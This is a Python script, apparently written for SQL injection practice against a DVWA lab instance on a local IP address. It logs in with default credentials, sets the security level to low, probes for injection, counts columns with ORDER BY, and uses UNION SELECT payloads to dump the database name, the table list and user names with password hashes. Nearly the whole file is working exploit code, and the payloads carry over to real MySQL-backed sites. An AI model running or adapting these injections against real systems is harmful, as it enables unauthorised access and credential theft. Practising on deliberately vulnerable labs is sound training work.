import requests
import time
import re


class HandleSqlInjectionExp(object):
    def __init__(self):
        self.header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
        }
        self.sql_injection_session = requests.session()

    def handle_login(self):
        '''
        登录
        :return:
        '''
        token_search = re.compile(r"name='user_token'\svalue='(.*?)'\s/")
        login_url = "http://192.168.1.9/dvwa/login.php"
        user_token = token_search.search(self.sql_injection_session.get(url=login_url,headers=self.header).text).group(1)
        data = {
            "username":"admin",
            "password":"password",
            "Login":"Login",
            "user_token":user_token,
        }
        self.sql_injection_session.post(url=login_url,headers=self.header,data=data)
        # 重置难度级别为低级
        self.sql_injection_session.cookies.set("security","low",domain='192.168.1.9',path='/dvwa')


    def handle_test_has_sql_injection(self):
        '''
        判断是否包含SQL注入漏洞
        :return:
        '''
        sql_injection.handle_login()
        #正常请求
        response = self.sql_injection_session.get(url="http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=1%27+and+1%3D1%23&Submit=Submit#")
        print(response.text)
        #异常请求
        response = self.sql_injection_session.get(url="http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=1%27+and+1%3D2%23&Submit=Submit#")
        print(response.text)

    def handle_column_value(self):
        '''
        判断字段数量
        :return:
        '''
        self.handle_login()
        for i in range(1,4):
            url = "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=1%27+order+by+"+str(i)+"%23&Submit=Submit#"
            response = self.sql_injection_session.get(url=url,headers=self.header)
            if 'Unknown column'in response.text:
                value = i - 1
                print(value)
                return

    def handle_user(self):
        '''手工注入'''
        self.handle_login()
        #获取数据库
        database_search = re.compile(r"database\(\)#<br\s/>First\sname:\s(.*?)<br\s/>Surname:\s(.*?)</pre>")
        database = database_search.findall(self.sql_injection_session.get(url="http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=1%27+union+select+version%28%29%2Cdatabase%28%29%23&Submit=Submit#",headers=self.header).text)
        #获取其关联的表
        tables = self.sql_injection_session.get(url="http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=%3Fid%3D1%27+union+select+table_schema%2Ctable_name+from+information_schema.tables%23&Submit=Submit#",headers=self.header).text
        #获取最终用户名密码数据
        info = self.sql_injection_session.get(url="http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=1%27+union+select+user%2Cpassword+from+dvwa.users%23&Submit=Submit#",headers=self.header)
        print(info.text)


if __name__ == '__main__':
    sql_injection = HandleSqlInjectionExp()
    #判断是否含有注入漏洞
    # sql_injection.handle_test_has_sql_injection()
    #判断字段数
    # sql_injection.handle_column_value()
    sql_injection.handle_user()
